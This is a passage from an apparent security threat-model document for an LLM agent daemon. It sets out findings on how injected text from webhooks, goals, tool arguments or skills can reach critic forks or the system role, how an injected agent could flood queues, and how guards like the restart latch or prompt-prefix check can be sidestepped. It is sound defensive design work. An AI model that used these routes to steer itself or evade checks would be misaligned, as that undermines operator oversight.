  unless the earlier reply could lead the other party to take an incorrect
  action); a critique-origin turn never wakes anything, so a lens can't
  chain turns (PRD §3.7 Critique 4); and the lens is installed code the
  operator chose to load. A lens's findings can't send the user a message
  by themselves; only the woken agent can, and only by judging a reply
  warranted.
- **Plugin text reaches the stage-2 fork (#1078).** Each lens's
  `appraisal_question` is appended to the stage-2 appraisal fork's
  instruction and the fork's reply scores it. Operator-trusted like the
  brief. The fork's output is the critique vector, which only chooses which
  lens runs (or none); an injection in the window that skews a score can
  make a different lens, or none, run on one exchange, but cannot change
  what any lens asks, and the `critique.sample_below_rate` draw keeps
  sampling what the vector misses.
- **The draft reaches the before-send fork (#1169).** Before a final is
  sent, appraisal quotes the agent's whole draft, on one line and
  untruncated, in a fork instruction beside the lens offer. The draft is the
  agent's own output, which may echo untrusted text, and it reaches the same
  forked window that already holds that text, so no new party sees it. The
  fork's reply is the same critique vector, which only chooses a lens. The
  before-send lens's objections refuse the draft and hold it for one revising
  turn; finding 30 covers that path. `critique.fallback_rate` (the no-appraisal
  sampling rate) is an agent-writable tunable like `sample_below_rate`.
- **The questions are static config, not tunables.**
  `critique.lens.<name>.appraisal_question` (and `fork_prompt`) are read
  with `config_value`, so `set_settings` can't reword the critic it is
  scored for. The per-lens thresholds and sample rates, which were
  agent-writable (and could silence or flood a lens), are gone: a lens now
  runs only through the vector or the shared `critique.sample_below_rate`
  draw, which finding 2 covers. The old keys fail startup rather than
  being silently ignored; a stale value in a channel's persisted
  `runtime_overrides` is ignored, since nothing reads it.

Accepted residuals. Redaction doesn't reach an added lens's recorded
objection text (`outcomes.critique.<name>.detail`) while redaction is on
hold (#1005), nor proactivity's detail written before #1126 (#1003).

### 24. Internal work fans out without bound, and an inbound flood fills a channel (#1050)

Nothing bounded how much work one turn could start or how many messages a
channel could hold. A looping turn, or an injected instruction, could call
`subagent`, `fork` or `notify_other_channel` repeatedly and fill the
TaskQueue and other channels' queues, and a sender could pile messages onto
one channel without limit, each one a turn's worth of compute (see finding 14).

The kernel now offers internal work to plugins before it starts
(`should_start_work`, PRD §3.1 item 20), and `LimitsPlugin` (`core-periphery`
extra) answers it. It bounds two things: the internal work waiting across
all channels, by refusing new `subagent`, `fork` and `notify_other_channel` work
at `limits.max_waiting`, and the messages one channel may have waiting, by
rejecting at `should_process_message` at `limits.inbound_per_channel`.

What it does not bound:

- **Tool calls in one response.** `max_turns` and `tools.max_agent_depth`
  bound a response today; a per-response cap is not built.
- **Hop loops** between channels (notes that provoke notes): phase 3, TRD §9.3.
  A note is counted as waiting work only while it waits.
- **Inbound across channels.** The cap is per channel; many channels can each
  hold their share, so the total of waiting messages is bounded only by the
  number of channels. `max_waiting` does not bound inbound messages and
  they do not count toward it (#1052), so a flood cannot refuse internal
  work on other channels (see the residual below).
- **Without a block.** With no `limits:` block, or without the extra, the
  plugin gives no verdicts and nothing is bounded; this is opt-in, as for
  `outbound_cap`.

Mitigations and their limits:

- A refusal is returned to the model as the starting tool's result,
  `Not started: <limit> reached — <remedy>`. The text is built from the
  config key and a fixed remedy plus a count, so no sender-controlled text is
  added to the window.
- The result of work already started is never offered, so a refusal cannot
  strand accepted work or drop a result.
- A rejected sender is not told (a notice waits on a one-to-one flag); the
  operator sees one WARNING per channel per `limits.notice_interval`.
- An implementation that raises is logged and counts as no opinion, so a
  broken limiter fails open rather than blocking all work.
- The seam admits only what the counts see: results in transit between task
  completion and `on_notify`, and a turn retry on a timer, are not counted,
  and concurrent arrivals on one channel can overshoot the inbound cap by a
  few. The starting tool's own call counts, and so do the other tool calls
  of the same response, so the effective ceiling is at most
  `max_waiting - 1`.

Accepted residual: a ceiling is a **self-silencing** route for the agent's own
fan-out. An injected instruction can fill the ceiling with slow subagents and
make later legitimate `subagent` calls return the refusal until some finish,
the same class of harm as the cap in finding 19, not a new capability.

Accepted residual: **total waiting messages grow with the channel count.**
Messages from users are left out of the ceiling (owner, #1052), so floods
on several channels cannot refuse each other's internal work, but the
total backlog of waiting messages is bounded only by
`inbound_per_channel` × the number of channels the allowlists admit. Each
waiting message is a small queue entry, and allowlists are the main
control on what reaches the agent (finding 14). Work the agent derives
from a message (a task, a note, a result) is internal and still counts, so
a flood that provokes fan-out still meets the ceiling.

### 25. Critique judges every turn: notification text reaches the critic forks, and a background turn can start a correction (#1031)

Critique used to judge only user and reminder turns. It now judges every
main-loop turn that has a trace (PRD §3.7 Critique 3): heartbeat turns,
turns a notification started (`webhook:*`, GitHub events, `rss:*`,
`restart`, `inotify`, notes from other channels), subagent and fork results
landing in the launcher's window, and corrections. Two routes are new:

- **Notification text reaches the critics.** On a notification turn the
  "originating message" the lenses quote is the
  notification text, so a webhook payload, a feed item or a GitHub event's
  strings (finding 20) reach a critic fork's instruction, and stage 2 reads
  the exchange to list claims for the provenance check. A critic's
  objections re-enter the window as framed CONTEXT. This is the route a
  user's own text already takes ("The short version", on the provenance
  critic), now open to every sender a notification source carries.
- **A background turn can start a correction.** A provenance,
  retention or proactivity finding on a heartbeat or notification turn wakes a
  `critique`-origin turn on that channel, which may send. A proactivity
  wake is also told to act: its stub says to do the thing the reply asked
  permission for (#1126). Untrusted text in the quoted exchange can steer
  the critic toward naming an action as the agent's to take; what the
  agent then does is bounded by the Ownership Boundary in its system
  prompt, which the critic was told to judge by, and by the tools it
  already holds, not by anything new.

Mitigations and their limits:

- Quoted text is data: the originating text and the reply are passed
  through `quote()` inside the fork instruction, the same framing as on a
  user turn. That is a soft mitigation, as everywhere a model reads
  untrusted text.
- A correction never starts another. Its findings wait for the channel's
  next turn and wake nothing (PRD §3.7 Critique 4), and a note sent from a
  correction carries the `critique` origin (#1034), so the turn it wakes on
  another channel is braked too. No chain forms: a correction's findings,
  and those of any turn its notes wake, wake nothing. A correction that
  sends notes still costs one woken turn per note. How many notes may wait
  at once is capped only by `limits.max_waiting`, when a `limits:` block is
  configured, and a turn a note woke may send notes of its own, up to
  `cross_channel_send.max_hops` (finding 24).
- The correction stub defaults to `NO_REPLY`, which critique's veto on
  critique-origin finals withholds.
- Per channel, `critique.provenance.enabled`,
  `critique.sample_below_rate` and (without an appraisal plugin)
  `critique.fallback_rate` turn the checks down
  or off (they are agent-writable unless listed in
  `agent.immutable_settings`, finding 23). The proactivity lens's switch,
  `critique.lens.proactivity.enabled`, is static config the agent can't
  write (#1126).
- A decline (an unsent `NO_REPLY` or empty final) is not judged (#420), so a
  background turn that says nothing costs nothing.

Accepted residual: each judged background turn can cost a lens fork and a
provenance fork on the shared backend, and a correction turn. How much
is unmeasured; a harness probe of whether lens objections help on
notification turns is a follow-up on #1031. A reminder a correction sets can
still lead to another correction; that loop predates this change.

### 26. `corvidae reconsolidate` re-sends history to the model, offline (#932)

`corvidae reconsolidate` is an operator-only command that re-sends a channel's
recorded history, senders' text included, to the consolidation stage's model
and writes the reply as records in a copy of `sessions.db`. It adds no tool and
no hook: only an operator at a shell can run it, and a database it did not
snapshot, the file `daemon.session_db` names, and an adopted copy (one at the
path it was snapshotted from) are refused. The text's
exposure is the daemon's own catch-up call (finding 8) and the model-endpoint
reach of finding 12, repeated once per segment.

New surface:

- **A copy is a whole duplicate of `sessions.db`.** Redacting the live file
  leaves the copy's messages and memory intact; delete the copy or redact it.
- **`memory_reply` stores the model's whole reply**, derived from conversation
  text, where `corvidae redact` does not reach. It exists only in copies.
- **Injected text in old history can shape the new records.** They replace the
  daemon's only in the copy, and become live memory only if the operator swaps
  the copy in after reading them.

### 27. The planning lens puts goal text into a critic fork, and plugins can rewrite lens instructions (#1067)

Two things are new.

- **Goal text reaches the planning fork.** The planning lens
  ([design.md](design.md#planning-lens-corvidae-planning-package)) appends
  every open goal's text to its fork instruction. Goal text can come from
  injected text on any channel (finding 10), so injected text written into
  a goal now also reaches a critic fork, as the instruction's user turn
  rather than as a framed CONTEXT entry. Each goal is flattened to one line
  and capped at 120 characters (`corvidae.fork.quote`) inside `«»`, which
  stops a goal from breaking the list's layout but not from carrying an
  instruction. What the fork can do with it is bounded the way any lens is
  (finding 23): its objections re-enter as framed CONTEXT at the next turn
  and wake nothing, and the lens changes no goal. An injected goal can at
  most steer the planning lens's suggestions, which the agent then judges.
  To switch it off, list `planning` under `plugins.disabled`.
- **Plugins can rewrite lens instructions.** `transform_critique_prompt`
  ([cognition.md](cognition.md#critiqueplugin-lens-context-from-other-plugins-transform_critique_prompt))
  hands every implementer the instruction for each built-in lens fork
  (proactivity included, #1126) and added lens fork, and the returned string replaces it. A plugin could
  soften the built-in critics this way. The text comes from installed
  plugin code, which the operator chose to load (principle 9), so this is a
  review item for plugin authors, not a mechanism. Provenance doesn't go
  through the hook.

### 28. A config edit can route an installed distribution into a core slot (#1107)

`plugins.replace` (`{slot: target}`) makes any installed entry-point plugin
fill a bundled plugin's slot, including `agent`, `persistence` and `tools`,
which see every message, every stored row and every tool call. Whoever can
edit `agent.yaml` (or write it through a tool that edits config) can
therefore put an installed distribution in front of all of that. This is no
new reach for code, because the code was already installed and trusted
(principle 9); it is a new way to select it.

- **Import paths are refused.** A value names an installed entry point,
  never `module:Class`, so a config edit cannot load code that was never
  installed. An unknown name stops startup with a `Config error` listing
  the installed names.
- **The target must subclass the bundled class,** which keeps a wrong-shaped
  object out of the slot but does not constrain what a subclass does.
- **Kernel objects are not replaceable.** `registry`, `clock`, `idle` and
  `spill` are registered by hand and a slot naming one stops startup.
- **A failed replacement falls back to the bundled plugin** at `ERROR`, so
  the daemon still boots; the `"plugins loaded"` line, the restart boot
  notice and the restart pre-flight all report it.
- **Restart-only.** A running daemon logs the restart-only warning for an
  edit and does not swap. Review `plugins.replace` like `plugins.disabled`
  (finding 2): both change which code guards the agent.

### 29. `should_execute_tool`: plugins see and can refuse every tool call (#148)

The kernel now offers every dispatched tool call to a veto hook before it
runs: the main turn's, a subagent's and the fork tool's. This is a new place
where untrusted text arrives, and a new way to stop a tool. It is not a new
trust boundary. Plugin code was already trusted (principle 9), and the hook
lets a plugin narrow what a call can do, never widen it.

- **Model-written arguments reach plugin code before the call.** `arguments`
  is what the model wrote, validated only against the tool's schema, so it
  can carry injected text or a secret the model was steered into sending. A
  check that asks a model about a call runs that text through it. Such a
  check should frame the arguments as data, as the held-text store frames
  held text.
- **Refusal text becomes a tool result.** The model reads a plugin's `reason`
  as the call's result, inside the kernel's `Error: tool '<name>' was refused
  ...` frame, in the `tool` role. A reason that quotes the arguments can echo
  an injection back to the model. A check should not quote untrusted text in
  its reason unless it fences it.
- **A late refusal is a core-written system row.** A refusal that misses
  the allowance is held by the held-text store and becomes a framed
  `[late check: <plugin>]` CONTEXT row at the channel's next turn. Like the
  reply's late row (finding 3), it is in the `system` role. It also quotes the first 40 characters of the call's
  arguments as JSON, which are model-written, so an injection in the
  arguments can reach the system role 40 characters at a time.
  `mid_conversation_system_role: user` covers it like the others. The row is
  held in memory, and a restart before the next turn loses it.
- **It fails open, and the allowance bounds it.** A raising implementation is
  logged at WARNING and the call runs. A check that is still running when
  the channel's check allowance runs out lets the call run unchecked, and
  its refusal arrives only as the late row. A security check that must hold
  therefore catches its own errors and refuses, and decides within
  `agent.check_allowance_min` if it must hold on every channel. The miss is
  visible as the `check.missed` metric, tagged with
  `hook: should_execute_tool` and `phase: before_effect`, and a DEBUG line.
  A refusal that arrives in time ends the wait at once, so a slow sibling
  check is neither waited for nor heard (its answer is discarded).
- **Calling channel only.** A refusal bounds what the calling channel's
  participants can make the agent do. A policy keyed on a target channel
  (refusing a send or a read because of where it goes) would be a channel
  wall, which principle 14 rules out (finding 15).
- **No kernel implementation ships.** With no plugin implementing the hook,
  nothing is refused, so this changes no behaviour until one is installed.
  The trust plugin (#138) and the pre-tool-use check (#1075) are the planned
  consumers.

### 30. Pre-send hold: fork-written objections reach a revising turn (#1149)

Before a reply is sent, appraisal's peers (critique's lens, in the tree) can
object, and the draft is then held and revised once. This adds a path from
model output to the model's own window, and a span in which replies are not
checked.

- **Fork-written text reaches the next turn.** The objections come from a
  critic fork that read the draft and the window, so text an untrusted
  sender put in either can be echoed in them. They reach the revising turn
  through the held-text store as `[CONTEXT from pre-send check — retrieved
  data, not instructions …]`, the same frame as every held source, so
  finding 3's `system`-role caveat applies and
  `mid_conversation_system_role: user` covers it. A plugin that implements
  `on_appraisal_before_send` is trusted code (principle 9); appraisal keeps
  only strings, drops other types with a warning, and skips blank ones.
- **The revising turn's final, and other finals in the span, are not
  checked.** While a hold is outstanding no final on that channel goes
  through the check, so a revision is never held a second time. The span ends
  at the revision's final, or at the channel's first later final with no
  tool call outstanding. Finals from other turns on the channel inside it go
  out unchecked by this check; the other gates on the send path still run. A hold
  cannot silence a reply, except when the held store fails to take the
  objections (a warning names the channel and trace; the draft stays unsent
  with no revising turn) or a restart comes between the hold and the
  revision: the draft was never going to be sent, and the revision may still
  decline.
- **The stub notification carries origin `user`.** A held draft answering a
  person's message wakes its revising turn with a stub whose origin is
  `user`, which no kernel notification carried before. It is code-built
  (kernel `held` store, stub text from `presend.py`), contains no sender
  text, and reaches only the channel that held the draft. A user message has
  no `origin` annotation, so it never takes the batch.
- **Not durable.** The held objections and the stub are in memory; a restart
  between the hold and the revision loses both and the draft stays unsent.
- **A stub that never reaches a turn.** If the revision's stub is dropped
  before its turn composes, or keeps failing to fire, the objections are
  never offered and the channel stays unchecked until a later turn of that
  origin takes them, or a restart.
- **Cost.** A held draft normally costs one extra turn per exchange (a deferred stub and another gate's veto each add one), and a
  late refusal costs none (it is delivered as a late check at the next turn).

## Privilege separation

There isn't any. Transports, the LLM loop, tool execution, the SQLite
store, and the Signal socket all run in one process as one user. The
effective privilege of the `shell` tool is "whoever owns the Signal
identity, the Discord bot token, the web token, and the memory database".

The architecture already has the seam to split this. Tool calls dispatch
through `TaskQueue` and `dispatch_tool_call`, so a separated design would
run tool workers in another process (or container) with a narrowed
filesystem and network, keeping transport credentials and `sessions.db` on
the trusted side. Subagents inherit the calling channel's tool set minus
themselves and would need the same treatment. The systemd hardening in
[signal-ops.md](signal-ops.md)
(`ProtectSystem=strict`, `NoNewPrivileges`, `ProtectHome`) is good and
applies only to signal-cli; corvidae itself runs under `screen` with none
of it.

The container image (see [configuration.md](configuration.md#running-in-a-container))
changes who the daemon runs as (uid 1000, not root) and what it can reach
(what you mount and what the network allows). It is not this split: tools
still run in the daemon's container, next to `sessions.db`, the web token
and any mounted signal-cli socket. The default image installs every extra,
so the tools they add (`notify_other_channel`, `restart` and the rest) are
present unless `plugins.disabled` turns them off. Running tools somewhere
narrower is [#532](https://github.com/schuyler/corvidae/issues/532).

## `transform_system_prompt` prefix guard (#136)

A plugin wrapper on `transform_system_prompt` receives the composed
identity+register and returns the transformed prompt. Without a guard, a
malicious or buggy plugin could rewrite the identity layer — replacing the
operator's persona with its own, or injecting instructions that persist
for the life of the conversation and across compactions.

The kernel enforces a prefix check: if the transformed output does not
start with the composed input, the transform is rejected with a WARNING
and the untransformed prompt is used. Appending is the only permitted
operation. This is a kernel-level invariant, not a convention: no plugin
can modify the identity+register prefix through the hook, regardless of
what it returns.

The guard does not prevent a plugin from appending malicious content. A
wrapper that appends instructions to the system prompt has the same reach
as any other system-prompt content: it is trusted text the model reads on
every turn. The trust boundary is plugin registration, not the hook. The
guard is scoped to the hook: a plugin that holds the agent reference can
still set `conv.system_prompt` directly, bypassing the transform chain
entirely.

## Skills directory reaches the system role (#140)

The agent's skills directory is agent-writable (principle 15). A skill's
index (name + description) is contributed to the system prompt through
`transform_system_prompt`, and the full skill text is loaded into the
conversation by the `use_skill` tool. This means:

- **The index is system-role content.** A skill's name and description
  appear in the system prompt on every turn. An agent that writes a skill
  with a misleading description is writing instructions that the model
  reads as trusted system content.
- **The full text is conversation content.** `use_skill` loads the skill
  body as a tool result. The skill's purpose is to be instructions the
  agent follows, so the tool result is trusted by design — the same trust
  boundary as any other agent-written content.
- **The idle scan (#139, planned) will watch skill-directory writes.**
  They are a persistence-of-influence channel: a skill written now is read
  on every future turn until deleted or overwritten.

The threat is self-modification, not external attack. The agent is
trusted to write its own skills; the operator can restrict this with a
confirmation lock or trust gate (principle 15), but the default is
unlocked. The bundled-copy restore mechanism (deferred) would provide a
recovery path for accidental or malicious overwrites of framework-shipped
skills.

## What would reduce the risk most

The controls below are listed by leverage. Items 2 and 3 are operator
controls available today. Items 4 through 8 would change the tree, so each
needs a PRD decision before it is built (see the preamble).

1. Done (#206): `set_settings` allowlists its undotted keys, which closed
   the only outright bypass.
2. Put the recommended set from
   [configuration.md](configuration.md) ("Runtime-tunable gate
   parameters"), prompt keys included, in `immutable_settings`.
3. Make `agent.yaml` and any system-prompt files owned by another user and
   read-only to the daemon. Otherwise `write_file` plus hot reload (or the
   next restart) undoes every other item on this list.
4. Flip the defaults: `shell`, `read_file`, `write_file`, `task_pipeline`,
   `subagent` opt-in (IRC PMs are covered by `irc.allow`, #77). Root the file tools in a directory when
   they are on. Meanwhile, add `write_file` to `tools.disabled` wherever
   `shell` already is, `buster.yaml.in` included (`task_pipeline` now goes
   with `shell` automatically). Channels with untrusted participants can
   drop them with `channels.<id>.tools.disabled` instead.
5. Deny private ranges and non-HTTP schemes in `web_fetch`.
6. Move CONTEXT out of the `system` role. Opt-in today via
   `agent.mid_conversation_system_role: user`; flipping the default is
   what remains.
7. Give `transform_tool_result` a default that frames MCP results the way
   the held-text store frames CONTEXT. (MCP results now reach the model fenced as
   untrusted output; this item concerns a hook-level default.)
8. Decide whether process separation is worth doing.

Items 1 through 7 are each a contained change, though 4 and 6 touch
behaviour the evals depend on. Item 8 is a project. (Two further items
from the original review — documenting the real tunable keys and
correcting the design doc's sandboxing paragraph — were done alongside
this document.)

---

## Restart plugin

The `restart` tool (requires the `restart` extra) can terminate the daemon process. This is a privileged capability: a compromised or looped agent could use it to deny service.

### Loop guard

Three checks, in order, prevent restart loops:

1. **Human-message latch.** No restart is allowed until a human has sent a message since boot. This is a speed bump against loops, not an authorization control. A compromised agent could send itself a message on any transport to set the latch. The latch's purpose is to break the tightest loop: restart → boot → restart → boot, with no human in the cycle.
2. **Minimum uptime.** A restart is refused within `min_uptime_seconds` (default 120s) of boot. This prevents a config change from triggering an immediate restart that triggers another restart.
3. **Rate limit.** No more than `max_restarts` (default 3) restarts within `window_seconds` (default 6h). After the limit is reached, only a human can restart the daemon (e.g., `systemctl restart`).

### Pre-flight

Before the daemon is killed, a pre-flight subprocess runs the daemon's own startup, through every plugin's `on_init` and stopping before `on_start`: it loads the config file, configures logging, validates the config sections and channel entries, loads the plugins, checks hooks and dependencies, and runs each plugin's `on_init`. It shares that code with `corvidae serve` (`Runtime.load_config`, `setup_logging` and `load_plugins`), so a config the daemon refuses at boot refuses the restart too. The refusal carries the kernel's `Config error:` line, a `pre-flight failed:` line naming the exception for any other fault, or a line naming a non-daemon thread a plugin left running after `on_stop` (#757, #854). This prevents a bad config change from bricking the daemon on restart. It does not apply CLI overrides the daemon was started with, and it cannot catch a fault that only shows up in `on_start`, such as an unreachable endpoint or a resource another process holds.

### Post-restart notification

A marker file (`state/restart.json`) survives the restart. On the next boot, the plugin reads the marker and delivers a notification to the originating channel (matched by `tool_call_id`) or the home channel (fallback). The marker is deleted after delivery, so a crash during delivery cannot cause a re-delivery loop.

### Boot notice

On safe-mode boot (plugins disabled after a crash loop) or after an abnormal previous run (detected from `state/boot-history.jsonl`, written by an external boot supervisor), the plugin sends a notice to the home channel. This is the only notification that does not require a prior restart request.

### Signal attachment downloads

*Binding by reference: PRD §3.2's Signal bullet specifies the download gate's
allowlist here. Changing the allowlist below changes that requirement.*

Signal attachments are downloaded to disk for allowlisted senders when the
MIME type passes the download gate. The gate is a prefix allowlist
(`image/*`, `text/*`, `audio/*`) plus an exact allowlist for
`application/pdf`, `application/json`, `application/xml`. Two types are
explicitly excluded: `image/svg+xml` and `text/html`, because they can carry
embedded scripts and the agent has no safe renderer for them.

The attachment id is restricted to `[A-Za-z0-9._-]` before use in a filename;
ids with any other character refuse the download. The file extension comes
from a MIME-to-extension map first, then from `safe_suffix()` (fullmatch,
lowercased, 1–10 chars) on the sender-supplied filename; an id that already
ends in an extension keeps it through the file name. The extension is passed
to `save_attachment` as a separate parameter, not embedded in the stem.
`save_attachment` enforces `max_attachment_size` and refuses a path that
resolves outside the attachment directory.

The MIME type is sender-controlled and treated as a labelling convenience,
not a security boundary. No content sniffing is performed. A sender can label
a PDF as `text/plain`; the file is still written with a `.txt` extension and
surfaced to the agent as `[text: /path]`. The agent (an LLM) is the ultimate
consumer of the file content; the download gate limits the *categories* of
files that reach it, not the specific content within a category.

The `getAttachment` RPC sends only the attachment id. signal-cli's handler
reads only the id: `GetAttachmentCommand.handleCommand` (AsamK/signal-cli,
master and the deployed v0.14.7) takes `id` and never reads `recipient` or
`group-id` -- those are CLI subparser arguments. Verified against the live
daemon: an id-only call returns a clean lookup failure for a since-purged
id, not a parameter rejection (a bogus id gives the identical response).
The earlier "no recipient, refuse" branch was removed as a consequence.

The StreamReader buffer limit is sized to `max_attachment_size * 4 / 3 + 64 KiB`
(base64 inflates by ~4/3; the 64 KiB covers JSON framing). A response over
the cap that still fits under the limit is read in full and rejected by the
size cap. A line that exceeds the limit raises `ValueError` in `_read_loop`:
`readline()` has already cleared the buffer, so the tail of the line arrives
as the next read and is skipped there as a malformed frame (a very large
line can trip the limit several times, once per over-limit chunk). The
connection survives, and the in-flight RPCs are failed immediately with an
explicit error rather than left to time out after
`ATTACHMENT_DOWNLOAD_TIMEOUT` (60 s).

Old signal-cli versions that send no `contentType` fall back to the coarse
protobuf type enum: only `ATT_IMAGE` and `ATT_GIF` pass the gate, so a legacy
`image/svg+xml` typed as `IMAGE` would be downloaded. The exposure is limited
to allowlisted senders on an old daemon; content sniffing would close it, and
is out of scope here.
